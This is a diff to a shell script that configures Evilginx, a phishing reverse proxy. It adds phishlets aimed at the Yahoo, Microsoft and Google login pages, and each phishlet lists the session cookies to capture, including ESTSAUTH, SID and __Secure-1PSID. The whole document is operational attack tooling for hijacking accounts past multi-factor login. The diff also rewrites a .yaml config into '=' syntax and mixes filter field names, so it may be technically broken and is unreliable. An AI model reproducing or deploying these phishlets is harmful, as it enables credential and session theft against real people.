@@ -577,17 +577,17 @@ configure_evilginx_integration() {
 
     # Create Evilginx config
     cat > "$EVILGINX_DIR/config.yaml" << EOF
-daemon: true
-debug: true
-domain: $DOMAIN
-ipv4: $VPS_IP
-http_port: 8081
-https_port: 8443
-dns_port: 0
-redirect_url: https://www.google.com
-phishlets_path: $EVILGINX_DIR/phishlets
-cert_path: $EVILGINX_DIR/certs
-database: $EVILGINX_DIR/evilginx.db
+daemon = true
+debug = true
+domain = $DOMAIN
+ipv4 = $VPS_IP
+http_port = 8081
+https_port = 8443
+dns_port = 0
+redirect_url = https://www.google.com
+phishlets_path = $EVILGINX_DIR/phishlets
+cert_path = $EVILGINX_DIR/certs
+database = $EVILGINX_DIR/evilginx.db
 EOF
 
     # Create Yahoo phishlet
@@ -597,7 +597,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '$EP1', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true}
 sub_filters:
-  - {triggers_on: 'login.yahoo.com', orig: 'login.yahoo.com', repl: '$EP1.{hostname}', trg: 'login.yahoo.com', type: 'header'}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', phish_sub: '$EP1'}
 auth_tokens:
   - domain: '.yahoo.com'
     keys: ['A3', 'A1', 'A1S']
@@ -652,7 +652,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '$EP2', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
 sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig: 'login.microsoftonline.com', repl: '$EP2.{hostname}', trg: 'login.microsoftonline.com', type: 'header'}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', phish_sub: '$EP2'}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
@@ -707,7 +707,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '$EP3', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
 sub_filters:
-  - {triggers_on: 'accounts.google.com', orig: 'accounts.google.com', repl: '$EP3.{hostname}', trg: 'accounts.google.com', type: 'header'}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', phish_sub: '$EP3'}
 auth_tokens:
   - domain: '.google.com'
     keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
